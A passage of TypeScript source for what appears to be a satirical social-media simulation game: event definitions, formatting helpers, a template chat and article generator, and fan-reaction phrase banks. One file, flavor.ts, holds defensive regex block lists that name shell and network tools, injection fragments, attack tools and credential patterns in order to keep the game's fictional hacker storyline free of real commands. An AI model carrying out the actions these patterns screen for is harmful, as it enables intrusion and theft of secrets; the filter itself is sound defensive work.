      : { reputation: 4, outcome: "\"Wishing them well.\" The restraint is somehow trending." },
  },
  {
    type: "charity", weight: 2,
    make: (rng) => { const cause = rng.pick(["ocean cleanup", "a children's hospital", "free school lunches", "wildfire relief"]); return { title: `Fans want you to fund ${cause}`, body: "A GOD Fan Club petition hit 200k signatures.", data: { cause, amt: rng.int(5, 100) * 1e6 } }; },
    choices: [{ id: "give", label: "Donate", hint: "big reputation" }, { id: "match", label: "Match fan donations", hint: "community moment" }, { id: "no", label: "Not now", hint: "-reputation" }],
    resolve: (c, rng, d) => c === "give" ? { cash: -Number(d.amt), reputation: 10, opinion: 4, outcome: `Donated to ${d.cause}. Even Overrated HQ went quiet.`, topic: { category: "organization", label: `the ${d.cause} donation`, subject: `${d.cause}`, valence: 0.9, magnitude: 6.5, amount: Number(d.amt) } }
      : c === "match" ? { cash: -Number(d.amt) / 3, reputation: 7, followers: 500_000, outcome: "Fans raised a record amount. You matched it.", topic: { category: "event", label: `the ${d.cause} match`, subject: `${d.cause}`, valence: 0.8, magnitude: 5.5, amount: Number(d.amt) / 3 } }
      : { reputation: -4, outcome: "\"Not now\" did not go down well." },
  },
  {
    // only spawned by the gh0st storyline (undernet.ts), never at random
    type: "leak", weight: 0,
    make: () => ({ title: "gh0st leak", body: "", data: {} }),
    choices: LEAK_CHOICES,
    resolve: (c, rng, d, s) => resolveLeak(c, rng, d, s),
  },
];

```

## src/lib/sim/flavor.ts
```ts
/**
 * Guard for the hacker storyline. Everything gh0st and the Undernet crew "do" is narrative flavor:
 * made-up memos, in-world defacements, cryptic threats. Nothing here may look like a real command,
 * exploit, tool, address or personal-data pattern. Any line that trips a rule is replaced with a safe one.
 */
const RULES: [name: string, re: RegExp][] = [
  ["shell", /((^|[\s`'"(])(sudo|rm\s+-|chmod|chown|curl|wget|powershell|cmd\.exe|ssh|scp|netcat|nc\s+-|telnet|ftp|ping\s+-|apt(-get)?\s+install|pip\s+install|npm\s+i(nstall)?\s|base64)\b|\b(bash|zsh|sh|exec|eval)\s+(-\w|\/|\.\/|["'`]))/i],
  ["operators", /(\$\(|&&|\|\||\|\s*\w|;\s*\w+\s*-|>\s*\/|`[^`]*`|\$\{|%[0-9a-f]{2}|\\x[0-9a-f]{2})/i],
  ["code", /(<\s*\/?\s*(script|iframe|img|svg|object|embed)\b|javascript:|onerror\s*=|onload\s*=|function\s*\(|=>\s*\{|import\s+[\w{}*, ]+\s+from\b|import\s*\(|\bimport\s+\w+\s*;|\b\w+\.\w+\s*\(\s*["'`]|require\s*\(|document\.(cookie|write|location|body|get\w*)|window\.(location|open)|alert\s*\()/i],
  ["sql", /(\bunion\s+select\b|\bselect\s+.+\s+from\b|\bdrop\s+table\b|\binsert\s+into\b|\bdelete\s+from\b|'\s*or\s*'?\d|\bor\s+1\s*=\s*1\b|--\s*$)/i],
  ["paths", /(\/etc\/|\/bin\/|\/usr\/|\/var\/|\/tmp\/|c:\\|\\windows\\|\.\.\/|~\/\.|\.(exe|sh|bat|ps1|dll|py|php|jsp|asp)\b)/i],
  ["network", /(\b\d{1,3}(\.\d{1,3}){3}\b|\b(localhost|0\.0\.0\.0)\b|\b[a-z][\w-]*:\d{2,5}\b|https?:|www\.|\.(com|net|org|io|onion|ru|xyz)\b)/i],
  ["tools", /\b(nmap|metasploit|msf\w*|sqlmap|burp|hydra|hashcat|john\s+the|mimikatz|wireshark|aircrack|kali|parrot\s*os|cobalt\s*strike|shodan|tor\s+browser|keylogger|rootkit|botnet|payload|shellcode|exploit|cve-\d|zero[- ]?day|0day|brute[- ]?force|phishing\s+kit|ddos|dos\s+attack|sql\s*injection|xss|csrf|ransomware|malware|trojan|backdoor|privilege\s+escalation|reverse\s+shell)\b/i],
  ["secrets", /\b(password|passwd|pwd|api[_ -]?key|token|secret[_ -]?key|private[_ -]?key|ssn|social\s+security|routing\s+number|iban|cvv|pin\s+code)\s*[:=]/i],
  ["email", /[\w.+-]+@[\w-]+\.[a-z]{2,}/i],
  ["phone", /(\+\d{1,3}[\s-]?)?\(?\d{3}\)?[\s.-]\d{3}[\s.-]\d{4}\b/],
  ["card", /\b(?:\d[ -]?){13,19}\b/],
  ["hex", /\b(0x)?[0-9a-f]{16,}\b/i],
  ["address", /\b\d{1,5}\s+\w+\s+(street|st|avenue|ave|road|rd|lane|ln|boulevard|blvd)\b/i],
];

export function flavorProblems(text: string): string[] {
  // in-world @handles (e.g. @quinn.exe) are names, not files or addresses
  const t = text.replace(/(^|\s)@[\w.]+/g, "$1@user");
  return RULES.filter(([, re]) => re.test(t)).map(([n]) => n);
}
export const isFlavorSafe = (text: string) => flavorProblems(text).length === 0;
/** returns the text if it passes, otherwise the fallback (which must itself be safe) */
export const safeFlavor = (text: string, fallback: string) => (isFlavorSafe(text) ? text : fallback);

```

## src/lib/sim/format.ts
```ts
export function fmtMoney(n: number, opts: { sign?: boolean } = {}): string {
  const a = Math.abs(n);
  const s = n < 0 ? "-" : opts.sign ? "+" : "";
  if (a >= 1e12) return `${s}$${(a / 1e12).toFixed(2)}T`;
  if (a >= 1e9) return `${s}$${(a / 1e9).toFixed(a >= 1e11 ? 0 : a >= 1e10 ? 1 : 2)}B`;
  if (a >= 1e6) return `${s}$${(a / 1e6).toFixed(a >= 1e8 ? 0 : 1)}M`;
  if (a >= 1e3) return `${s}$${(a / 1e3).toFixed(0)}K`;
  return `${s}$${a.toFixed(0)}`;
}
export function fmtCount(n: number): string {
  if (n >= 1e9) return `${(n / 1e9).toFixed(1)}B`;
  if (n >= 1e6) return `${(n / 1e6).toFixed(1)}M`;
  if (n >= 1e4) return `${(n / 1e3).toFixed(0)}K`;
  if (n >= 1e3) return `${(n / 1e3).toFixed(1)}K`;
  return String(Math.round(n));
}
export function relTime(t: number, now: number): string {
  const d = Math.max(0, now - t) / 1000;
  if (d < 45) return "now";
  if (d < 3600) return `${Math.round(d / 60)}m`;
  if (d < 86400) return `${Math.round(d / 3600)}h`;
  return `${Math.round(d / 86400)}d`;
}
/** "just now" / "5m ago" — never "now ago". */
export function relAgo(t: number, now: number): string {
  const r = relTime(t, now);
  return r === "now" ? "just now" : `${r} ago`;
}
export function clockTime(t: number): string {
  return new Date(t).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
}
export function dayLabel(t: number, now: number): string {
  const a = new Date(t), b = new Date(now);
  if (a.toDateString() === b.toDateString()) return `Today at ${clockTime(t)}`;
  const y = new Date(now - 86400000);
  if (a.toDateString() === y.toDateString()) return `Yesterday at ${clockTime(t)}`;
  return `${a.toLocaleDateString([], { month: "short", day: "numeric" })} ${clockTime(t)}`;
}
export function dayOnly(t: number, now: number): string {
  const a = new Date(t), b = new Date(now);
  if (a.toDateString() === b.toDateString()) return "Today";
  if (a.toDateString() === new Date(now - 86400000).toDateString()) return "Yesterday";
  return a.toLocaleDateString([], { weekday: "long", month: "short", day: "numeric" });
}

```

## src/lib/sim/generator.ts
```ts
import type { Rng } from "./rng";
import type { Article, ArticleKind, Character, Channel, Outlet, Server, Topic, WorldState } from "./types";
import { expand, type Slots } from "./grammar";
import { styleText } from "./style";
import { fmtMoney } from "./format";
import { CAT_OPEN, CHIRP_GOD, CHIRP_LIFE, CMP, GOD_OPEN, HEADLINES, PERSONAL, POLITE, REPLY, STANCE_TAIL, THING, WORLD_OPEN } from "./templates";
import { EMOJI_HYPE, EMOJI_LAUGH, EMOJI_SHADE } from "./data";
import { actionDef, type ActionKind } from "./topics";
import { ambientLine } from "./godspeak";

export type Intent =
  | "open" | "personal" | "inside" | "agree" | "disagreeFan" | "disagreeHater" | "disagreeNeutral" | "joke" | "question" | "answer"
  | "pileon" | "followup" | "memory" | "mod" | "backup" | "drift" | "godReply" | "godReplyHater" | "fix" | "ambient";

export interface ChatCtx {
  rng: Rng;
  state: WorldState;
  speaker: Character;
  intent: Intent;
  topic?: Topic;
  target?: Character;
  server: Server;
  channel: Channel;
  t: number;
  typoWord?: string;
}

export interface PostCtx { rng: Rng; state: WorldState; author: Character; topic?: Topic; t: number; platform: string }
export interface ArticleCtx { rng: Rng; state: WorldState; outlet: Outlet; topic: Topic; kind: ArticleKind; t: number; quotes: { who: Character; text: string; where: string }[] }

/**
 * Pluggable content generator. The default is a deterministic template grammar.
 * An LLM-backed generator could implement the same interface (e.g. rewriting text
 * from these contexts) without touching the engine. Must be deterministic for a
 * given rng state to keep catch-up reproducible.
 */
export interface ContentGenerator {
  id: string;
  chat(ctx: ChatCtx): { text: string; typoWord?: string; clean?: string };
  /** optional: rewrite a reaction line to @god (an LLM could implement this); must stay deterministic for a given rng */
  react?(ctx: { rng: Rng; state: WorldState; speaker: Character; draft: string; godText: string }): string;
  post(ctx: PostCtx): { text: string; title?: string };
  article(ctx: ArticleCtx): Pick<Article, "headline" | "dek" | "body">;
}

const young = (c: Character) => c.voice === "zoomer" || c.voice === "lowercase" || c.voice === "terse" || c.voice === "emoji" || c.voice === "caps";

export function slotsFor(rng: Rng, state: WorldState, c: Character | undefined, topic?: Topic, extra: Slots = {}): Slots {
  const celeb = topic?.celebrityId ? state.characters[Number(topic.celebrityId.slice(1))]?.displayName : topic?.facts.celeb;
  const hotWorld = state.topics.filter((x) => x.about === "world" && x.heat > 1);
  return {
    god: () => (c && young(c) ? rng.pick(["god", "god", "bro", "this man", "@god", "him", "the goat"]) : c && (c.voice === "formal" || c.voice === "proper") ? rng.pick(["@god", "God", "he"]) : rng.pick(["god", "@god", "God", "the guy"])),
    label: topic?.label ?? "all this",
    subj: topic?.subject ?? topic?.label ?? "this",
    amt: topic?.amount ? fmtMoney(topic.amount) : rng.pick(["$400M", "a billion", "$2B", "$80M"]),
    tag: topic ? `#${topic.tag}` : "",
    coin: topic?.facts.coin ?? topic?.facts.ticker ?? "GOD",
    celeb: celeb || "some celeb",
    cmp: () => rng.pick(CMP),
    thing: () => rng.pick(THING),
    n: () => String(rng.int(2, 60)),
    outlet: () => rng.pick(state.outlets).name,
    day: () => ["sunday", "monday", "tuesday", "wednesday", "thursday", "friday", "saturday"][new Date(topic?.startedAt ?? 0).getDay()],
    laugh: () => (c && !young(c) ? rng.pick(["lol", "haha", "😂", "LOL"]) : rng.pick(c?.emojis.filter((e) => EMOJI_LAUGH.includes(e)).length ? c.emojis.filter((e) => EMOJI_LAUGH.includes(e)) : EMOJI_LAUGH)),
    hype: () => rng.pick(EMOJI_HYPE),
    shade: () => rng.pick(EMOJI_SHADE),
    world: () => (hotWorld.length ? rng.pick(hotWorld).label : rng.pick(PERSONAL)),
    personal: () => rng.pick(PERSONAL),
    ...extra,
  };
}

export const TemplateGenerator: ContentGenerator = {
  id: "template-grammar-v1",
  chat(ctx) {
    const { rng, speaker: c, topic, intent, target, channel, server } = ctx;
    const past = c.memory.filter((m) => m.topicId !== topic?.id);
    const slots = slotsFor(rng, ctx.state, c, topic, {
      user: target?.username ?? "someone",
      ch: channel.name,
      server: server.name,
      past: past.length ? rng.pick(past).label : rng.pick(server.insideJokes),
    });
    let tpl: string;
    switch (intent) {
      case "open":
        if (!topic) { tpl = rng.pick(PERSONAL); break; }
        if (topic.about === "world") { tpl = rng.pick(WORLD_OPEN[topic.category] ?? WORLD_OPEN.drama); break; }
        if (!topic.facts.action && CAT_OPEN[topic.category] && rng.chance(0.75)) tpl = (() => { const base = rng.pick(CAT_OPEN[topic.category]); return rng.chance(0.55) ? `${base}${/[?!]$/.test(base) ? " " : rng.pick([". ", ", ", " "])}${rng.pick(STANCE_TAIL[c.stance])}` : base; })();
        else tpl = CAT_OPEN[topic.category] && rng.chance(0.35) ? rng.pick(CAT_OPEN[topic.category]) : rng.pick(GOD_OPEN[c.stance]);
        break;
      case "personal": tpl = rng.pick(PERSONAL); break;
      case "ambient": return styleText(rng, c, ambientLine(ctx.state, rng, c), { short: true });
      case "inside": tpl = rng.pick([`{?remember }${rng.pick(server.insideJokes)}{? lmao| 😭| lol|}`, `not ${rng.pick(server.insideJokes)} again`, `this is giving ${rng.pick(server.insideJokes)}`]); break;
      case "fix": tpl = `*${ctx.typoWord ?? "that"}`; break;
      case "answer": tpl = rng.pick(topic ? REPLY.answer : REPLY.answerNone); break;
      case "question": tpl = rng.pick(topic ? REPLY.question : ["wait what", "huh", "?", "what"]); break;
      default: tpl = (c.voice === "formal" || c.voice === "proper" || c.voice === "boomer") && POLITE[intent] && rng.chance(0.8) ? rng.pick(POLITE[intent]) : rng.pick(REPLY[intent] ?? REPLY.agree);
    }
    let raw = expand(tpl, slots, rng);
    if (target && intent !== "backup" && intent !== "fix" && rng.chance(intent.startsWith("disagree") ? 0.3 : 0.12)) raw = `@${target.username} ${raw}`;
    if (intent === "fix") return { text: raw };
    const short = intent !== "open" && intent !== "personal";
    if (intent === "mod") {
      const s = raw[0].toUpperCase() + raw.slice(1);
      return { text: /[.!?]$/.test(s) ? s : s + "." };
    }
    return styleText(rng, c, raw, { short });
  },
  post(ctx) {
    const { rng, author: c, topic, platform } = ctx;
    const slots = slotsFor(rng, ctx.state, c, topic);
    let tpl: string;
    if (!topic) tpl = rng.pick(CHIRP_LIFE);
    else if (topic.about === "god") tpl = rng.chance(0.7) ? rng.pick(CHIRP_GOD[c.stance]) : rng.pick(GOD_OPEN[c.stance]) + " {tag}";
    else tpl = rng.pick(WORLD_OPEN[topic.category] ?? WORLD_OPEN.drama) + " {tag}";
    let text = expand(tpl, slots, rng);
    if (c.voice === "zoomer" || c.voice === "lowercase") text = styleText(rng, c, text, { allowTypo: false }).text;
    let title: string | undefined;
    if (platform === "threadit") title = topic ? expand(rng.pick(["[Discussion] {label}", "Can we talk about {label}?", "{label} megathread", "Unpopular opinion about {label}", "Serious question about {label}"]), slots, rng) : expand(rng.pick(["What's something small that made your week?", "Rate my setup", "Anyone else exhausted lately?"]), slots, rng);
    if (platform === "tubeverse") title = topic ? expand(rng.pick(["I Tried Living Like @god For 24 Hours", "{label} EXPLAINED (it's worse than you think)", "Reacting to {label}", "The TRUTH About {label}", "Why Everyone Is Talking About {tag}"]), slots, rng) : expand(rng.pick(["Day in my life (realistic)", "I Tested Every Fast Food Fries", "My Honest Setup Tour 2026"]), slots, rng);
    if (platform === "snapgram") text = expand(rng.pick(["{?living my best life }✨ {tag}", "{label} has me thinking big {hype}", "weekend mood {hype}", "felt cute, might glaze later {tag}", "not me recreating {label} on a budget {laugh}"]), slots, rng);
    if (platform === "clipz") text = expand(rng.pick(["pov: you just heard about {label} {laugh}", "rating {label} out of 10 {tag}", "this sound + {label} 😭 {tag}", "{god} speedrun compilation {tag}", "day {n} of reacting to {label}"]), slots, rng);
    if (platform === "wire") text = expand(rng.pick(["📡 {label}. Thread below.", "Channel update: {label}", "⚡ Quick alpha: {label}", "Pinned: everything we know about {label}"]), slots, rng);
    return { text, title };
  },
  article(ctx) {
    const { rng, outlet, topic, kind, quotes } = ctx;
    const def = topic.about === "god" && (topic.facts.action as ActionKind | undefined) ? actionDef(topic.facts.action as ActionKind) : undefined;
    const slots = slotsFor(rng, ctx.state, undefined, topic, {
      headverb: def?.verb ?? ({ rumor: "is rumored to", allegation: "faces claims", leak: "hit by leak", viral: "goes viral", mention: "gets called out" } as Record<string, string>)[topic.category] ?? "makes waves with",
      hsubj: topic.subject ?? topic.label,
      gain: topic.amount ? fmtMoney(topic.amount * rng.range(0.05, 0.4)) : "millions",
    });
    let headline: string;
    const L = topic.label[0].toUpperCase() + topic.label.slice(1);
    if (topic.about === "world") headline = rng.pick([L, `${L}: what happened`, `The internet can't stop talking about ${topic.label.replace(/^the /, "how the ")}`, `Why "${topic.label}" took over the timeline`]);
    else headline = expand(rng.pick(HEADLINES[kind] ?? HEADLINES.report), slots, rng);
    if (topic.about === "god" && !def && kind === "breaking") headline = `BREAKING: ${topic.label[0].toUpperCase()}${topic.label.slice(1)}`;
    const amt = topic.amount ? fmtMoney(topic.amount) : undefined;
    const dek = expand(rng.pick([
      "The internet's main character did it again. Here's how the timeline reacted.",
      "Fans call it legendary. Critics call it excess. Everyone's talking.",
      `${amt ? `A reported ${amt}. ` : ""}Servers lit up within minutes.`,
      "What happened, who's mad, and what it means.",
      "It started with one post. Then everything moved at once.",
    ]), slots, rng);
    const body: string[] = [];
    body.push(expand(topic.about === "god"
      ? rng.pick([`@god ${slots.headverb} ${slots.hsubj}${amt ? `, in a move reportedly valued at ${amt}` : ""}, setting off a wave of reactions across Chirp, Lounge servers and fan communities.`,
        `It took less than ten minutes for {tag} to trend after @god ${slots.headverb} ${slots.hsubj}.`,
        `In the latest chapter of the internet's favorite storyline, @god ${slots.headverb} ${slots.hsubj}.`])
      : `${L}. The story spread quickly from Chirp to Lounge servers, where reactions ranged from delight to exhaustion.`, slots, rng));
    if (topic.about === "world") body.push(rng.pick([
      `By the afternoon, #${topic.tag} had picked up its own vocabulary: inside jokes, a copypasta, and at least one fan account dedicated to the saga.`,
      `Several large accounts weighed in, though as usual the most-liked replies were jokes rather than analysis.`,
      `Not everyone is interested. "${rng.pick(["i have a job", "who asked", "this is the dumbest week online"])}," one reply with thousands of likes reads.`,
      `${outlet.name} reviewed hundreds of posts on the topic; roughly half were memes.`,
    ]));
    if (amt) body.push(rng.pick([`${outlet.name} could not independently verify the ${amt} figure. Representatives for @god did not respond to a request for comment.`, `The ${amt} number, first floated by fan accounts, has since been repeated by several outlets.`, `For scale: ${amt} is more than most people will earn in ${Math.round(rng.range(200, 4000))} lifetimes.`]));
    const q = quotes.slice(0, 3);
    for (const x of q) body.push(`"${x.text}," wrote ${x.who.displayName} (@${x.who.username}), ${rng.pick(["a member of", "posting in", "a regular in"])} ${x.where}.`);
    body.push(kind === "opinion"
      ? rng.pick(["Whatever you think of him, the reaction says more about us than about him.", "We have to ask why one person's purchases occupy this much of our collective attention.", "Love it or hate it, it worked: everyone is looking."])
      : kind === "financial" || kind === "investigation" ? rng.pick(["Analysts say the move fits a pattern of high-visibility spending that tends to precede new ventures.", "Questions remain about how the deal was structured.", "Markets shrugged, then didn't."])
      : rng.pick(["This is a developing story.", "We'll update this article as more details emerge.", "Fans are already speculating about what comes next."]));
    return { headline, dek, body };
  },
};

let current: ContentGenerator = TemplateGenerator;
export const getGenerator = () => current;
export const setGenerator = (g: ContentGenerator) => { current = g; };

```

## src/lib/sim/godlines.ts
```ts
import type { Obsession } from "./types";

/**
 * Phrase banks for reactions to @god appearing. Lines are combined (lead + core + tail)
 * and filled with context slots, so the same exact sentence rarely repeats.
 * Slots: {q} what god said, {kw} a keyword from it, {coin}, {ch}, {server}, {user},
 * {past} an older god line, {pastwhere}, {mem} a memory of the speaker, {holding},
 * {nw} god's net worth, {world}, {personal}, {laugh}, {hype}, {shade}, {n}.
 */

export type GodIntent = "greeting" | "question" | "announcement" | "flex" | "joke" | "crypto" | "purchase" | "compliment" | "insult" | "sad" | "hype" | "farewell" | "generic";

/** first-wave hype leads — mostly fans, often caps */
export const LEAD: Record<Obsession, string[]> = {
  obsessed: ["HE'S HERE", "GOD IS IN THE CHAT", "NO WAY", "WAIT", "CHAT", "IT'S HIM", "OMG OMG", "I'M SHAKING", "THIS IS NOT A DRILL", "HE'S ONLINE", "AAAAAA", "EVERYBODY ACT NORMAL", "GUYS", "BRO", "HOLD ON"],
  supporter: ["oh he's here", "yooo", "god's online", "omg", "wait", "ayy", "lets gooo", "oh hey", "no shot", "oh snap"],
  business: ["noted.", "interesting timing", "god in chat on a {day}", "ok", "attention please", "huh"],
  skeptic: ["sure", "hm", "ok", "right", "wait", "lol"],
  rival: ["oh great", "here we go", "of course", "ugh", "cool", "yay"],
  hater: ["oh no", "ew", "here we go again", "great", "lmao", "bruh"],
  indifferent: ["oh", "huh", "ok", "who", "lol", "neat"],
};

export const HYPE: string[] = [
  "everybody act normal", "EVERYBODY ACT NORMAL", "screenshot this", "SCREENSHOT THIS RN", "i got notified and ran here", "phone buzzed and i sprinted here",
  "my notifications just exploded", "dropped my food for this", "clip it clip it", "mods pin this", "i'm framing this message", "the king has spoken",
  "he's typing in OUR server", "i was literally about to log off", "wake up everyone", "historic day in #{ch}", "i'm telling my kids about this",
  "this is the best day of my life", "i've been waiting {n} days for this", "first time seeing him live 😭", "he actually reads this chat??",
  "act cool act cool act cool", "nobody say anything weird", "who pinged him", "we have to behave now", "sit up straight everyone",
];

/** replies to god keyed by what he said */
export const TO_GOD: Record<GodIntent, string[]> = {
  greeting: [
    "sup {god}!!", "GOD SAID {Q} TO US", "hiii god 😭", "he said \"{q}\" to US. to us guys", "sup king 👑", "hey god how's your day going",
    "\"{q}\" 🥹", "yo god! how's {holding} doing", "hi god i've been here since day one", "@god sup!! long time", "he greeted us. we're family now",
    "@god hiii can you say hi to me specifically", "sup god, what are you up to today", "@god finally!! where have you been", "the way he just casually said {q}",
    "@god hey!! you picked the right server", "omg hi @god", "@god evening king (it's evening somewhere)",
  ],
  question: [
    "@god yes. whatever it is, yes", "ok god asked \"{q}\" everyone answer correctly", "@god depends, is this a test", "@god honestly? yes",
    "@god 100% do it", "god is asking US for advice 😭", "@god i'd say go for it", "@god i've thought about this for {n} minutes and the answer is yes",
    "he's asking about {kw}... is something coming", "@god why do you ask 👀", "@god what's your answer though", "everyone shut up he asked a question",
  ],
  announcement: [
    "WHAT IS IT", "@god drop it NOW", "he said \"{q}\" what does that mean", "announcing in #{ch} instead of #god-announcements is crazy", "i'm setting an alarm",
    "@god is it about {kw}?", "bro is about to change the timeline again", "@god hint pls", "clearing my schedule", "the leaks channel is going to be insane tonight",
    "@god how big are we talking", "everybody get ready",
  ],
  flex: [
    "the casual flex 😭", "bro said \"{q}\" like it's nothing", "@god can i have like 0.001%", "we're basically the same except the money",
    "net worth said hello", "@god teach me", "this man flexes in lowercase", "i felt that in my bank account", "@god how", "the {kw} flex is crazy",
    "not him flexing in #{ch} 😭", "@god adopt me",
  ],
  joke: ["LMAOOO he's funny too", "god has jokes 😭", "god shitposting in #{ch} was not on my bingo card", "💀💀 @god stop", "he's one of us fr",
    "@god this is why you're the goat", "the humor is also billionaire tier", "i actually laughed out loud", "@god chill i'm in class"],
  crypto: ["is that alpha??", "@god should i buy {coin}", "he mentioned {coin}. chart about to go vertical", "NFA but god said it", "@god are you in {coin}?",
    "buying {coin} with my rent money brb", "@god bull or bear", "whale alert 🐋", "if god says {kw} i'm listening", "@god which coin next"],
  purchase: ["@god what did you buy", "how much was it", "he's shopping again 😭", "{kw}?? receipts pls", "@god pics or it didn't happen",
    "@god was it expensive or GOD expensive", "the economy just moved", "@god can i come see it", "imagine just buying {kw} on a {day}"],
  compliment: ["he loves us 🥹", "@god we love you more", "i'm crying at work", "@god no YOU'RE the best", "he's so real for this", "wholesome god arc",
    "@god thank you for existing", "this is why we stan"],
  insult: ["god's in a mood lmao", "who made him mad", "he's talking to the haters 😭", "@god let them have it", "someone's getting ratioed",
    "@god it's not us right?", "the haters in #{ch} rn: 🫥"],
  sad: ["@god you ok?", "god having a rough day was not on my bingo card", "sending good vibes king", "@god we got you", "@god take a break, you earned it",
    "rich people get sad too i guess", "@god want us to cheer you up"],
  hype: ["LET'S GOOOO", "HE'S HYPED SO I'M HYPED", "@god WE'RE SO BACK", "the energy in #{ch} rn", "@god LFG", "this server is on fire", "god hype is contagious"],
  farewell: ["NOOO come back", "gn god", "he's leaving already 😭", "@god don't go", "@god come back soon", "he said {q} and left. iconic", "@god see you next time king"],
  generic: ["@god what have you been up to", "\"{q}\" — noted 📝", "he said \"{q}\"", "what does \"{q}\" mean", "@god say more", "@god explain", "@god elaborate pls",
    "we're analyzing \"{q}\" in #fan-discussion later", "\"{q}\" is going on a shirt", "@god what's new"],
};

/** stance-specific reactions to the appearance itself (any intent) */
export const BY_OBSESSION: Record<Obsession, string[]> = {
  obsessed: ["@god notice me pls", "@god i've been here every single day", "posting this on my fan account", "@god i named my cat after you", "I'M SCREAMING",
    "@god do you remember me?? i'm the one who made the {kw} edit", "i'm literally shaking rn", "@god marry me (platonically)", "god in #{ch} and i'm HERE for it",
    "mods please don't let this chat get flooded he has to see my message", "@god reply to me and i'll never ask for anything again", "this is going in my fan account highlights"],
  supporter: ["love to see it", "nice to see you around god", "good vibes in here today", "@god appreciate you popping in", "this server stays winning",
    "he actually hangs out here, that's cool", "god being normal in chat is so funny to me"],
  business: ["@god any thoughts on {holding}'s numbers?", "god in chat = volume up", "case study material", "@god what's the next move", "noting the time. markets react to less",
    "@god how do you decide what to buy", "@god hiring?", "every time he talks something moves", "@god quick question about {holding}"],
  skeptic: ["is it really him or a fan account", "verified badge or it didn't happen", "he types like a PR team", "we sure that's not a mod on an alt?",
    "god saying {q} is the least suspicious thing he's done this week", "y'all believe anything with a crown next to it", "ok but where's the {kw} receipts"],
  rival: ["he only shows up when he wants attention", "cool, now everyone's going to glaze for an hour", "i could say {q} and nobody would care",
    "watch the whole server forget i exist", "imagine being this excited about a greeting", "my message from earlier got 0 reacts btw",
    "of course he comes on right after i post my thing"],
  hater: ["oh great he's here", "y'all are embarrassing", "ratio'd by a {kw}", "mid message tbh", "can we go back to talking about literally anything else",
    "this chat lost all dignity in 4 seconds", "he's here to farm attention again", "{laugh} the glazing already started"],
  indifferent: ["who?", "anyway", "ok what did i miss", "oh is that the rich guy", "cool", "huh. ok"],
};

/** character → character chains during the burst */
export const CHAIN = {
  fanToHater: ["@{user} let us have this", "@{user} then leave lol", "@{user} you're in his server", "@{user} nobody asked", "@{user} cope", "@{user} you're literally here too"],
  haterToFan: ["@{user} you're literally shaking", "@{user} he doesn't know you exist", "@{user} it's a greeting not a marriage proposal", "@{user} get up off the floor",
    "@{user} he's not going to reply bro", "@{user} touch grass"],
  fanToFan: ["@{user} DID YOU SEE", "@{user} we're in the same timeline as him", "@{user} i screenshotted it first", "@{user} i can't breathe", "@{user} we're so lucky",
    "@{user} HE'S STILL TYPING??", "@{user} told you he reads this"],
  skepticToFan: ["@{user} calm down he said {q}", "@{user} it's two words", "@{user} breathe", "@{user} he's a person not a meteor shower"],
  noticed: ["@{user} bro thinks he got noticed 😭", "if he replies to me i'm retiring", "@{user} he looked at your message, i saw it", "the race to get noticed has begun",
    "@{user} you have to be funnier than that to get a reply", "everyone typing essays hoping he replies 😭"],
  catchUp: ["wait what did i miss", "what did he say??", "i was gone for 2 minutes", "someone summarize"],
  catchUpAnswer: ["@{user} he said \"{q}\"", "@{user} \"{q}\". that's it. we're losing it", "@{user} scroll up, he said {q}", "@{user} he said {q} and the server combusted"],
  memory: ["last time he was here he said \"{past}\"", "this is like when he said \"{past}\" in {pastwhere}", "@god was {mem} real?", "@god still thinking about {mem}",
    "@god remember \"{past}\"? we do", "first time since the \"{past}\" message", "@god are we getting a sequel to \"{past}\""],
  upTo: ["@god what have you been up to lately", "@god how's {holding}", "@god you've been quiet, what's cooking", "@god where were you all week", "@god what are you doing today"],
  drift: ["anyway did anyone see {world}", "ok back to {personal}", "unrelated but {world} is wild", "while we're here, anyone watching {world}?", "i'm eating cereal for dinner btw"],
  mod: ["ok everyone breathe, he's allowed to say hi", "keep it chill or he'll leave", "slowmode is on for 10s, behave", "please don't spam pings", "one message each, let's not scare him off"],
  still: ["is he still here?", "@god come back", "ok he left", "he's gone isn't he", "@god you still there?", "he's lurking, i can feel it"],
};

/** when @god replies to a specific character */
export const FREAK: Record<Obsession, string[]> = {
  obsessed: ["HE REPLIED TO ME", "GOD REPLIED TO ME I'M FRAMING THIS", "@god 😭😭😭 thank you", "i'm never deleting this account", "MOM GET THE CAMERA", "I CAN'T FEEL MY HANDS",
    "@god i will remember this forever", "SCREENSHOTTING SCREENSHOTTING"],
  supporter: ["wait he replied to me??", "@god thank you!! 🥹", "omg he replied", "@god this made my week", "not me getting a reply from god"],
  business: ["@god appreciate the reply. noted.", "@god thank you, i'll keep that in mind", "he replied. that's going in the portfolio", "@god follow-up: what's next"],
  skeptic: ["...ok that was actually him", "@god fine. you're real.", "he replied to me. i don't know how to feel", "@god respect for replying i guess"],
  rival: ["oh so NOW he replies", "@god took you long enough", "ok that was kind of cool", "don't make it a big deal guys"],
  hater: ["...ok that was kinda funny", "doesn't change anything", "he replied to ME? noted", "@god still not a fan", "ok fine one point to god"],
  indifferent: ["oh he replied", "huh. hi", "@god hi?", "cool"],
};
export const FREAK_OTHERS = ["@{user} you're famous now", "not fair he never replies to me", "@{user} what did it feel like", "bro got noticed", "screenshot before he deletes it",
  "@{user} you've been chosen", "@{user} you owe us a speech", "{user} got a god reply and i got nothing", "@{user} change your bio to 'noticed by god'", "@god reply to me next 😭"];

/** other servers talking about the appearance afterwards */
export const ECHO_OPEN = ["god was in {server} #{ch}", "he said \"{q}\" in {server} lmao", "{server} is losing it, god just typed \"{q}\"", "why does he always go to {server} and never here",
  "someone post the screenshot from {server}", "is the {server} thing real?", "god just showed up in {server} #{ch} and said \"{q}\"", "heard god was chatting in {server} 👀",
  "breaking: god said {q} in {server}", "{server} people are going to be insufferable now"];
export const ECHO_REPLY = ["wait what did he say", "he said \"{q}\"", "why never here 😭", "screenshot or fake", "i was there 😤", "@god come to {here} too", "jealous ngl",
  "{server} doesn't deserve him", "he'll come here next, trust", "they're all going to put it in their bios", "lowkey want to join {server} now", "it's just a message guys", "the {server} mods must be sweating"];

/** DMs to @god */
export const DM_OPEN: Record<Obsession, string[]> = {
  obsessed: ["hi god sorry to bother you. saw you in {server} today and just wanted to say you're the reason i'm online", "god!!! i saw you in #{ch} 😭 hi", "hey god, it's me from {server}. hope you're having a good day 🙏"],
  supporter: ["hey! saw you in {server}, just wanted to say hi", "hi god, big fan. no pressure to reply"],
  business: ["Hi — quick pitch, 30 seconds? I think {holding} could use a partner", "Hey, saw your message in {server}. Would love to talk about an investment idea."],
  skeptic: ["genuine question: is this account actually you?", "hey, are you actually god or a team"],
  rival: ["you know half that server only likes you for the money right", "ok i'll admit the {server} thing was funny"],
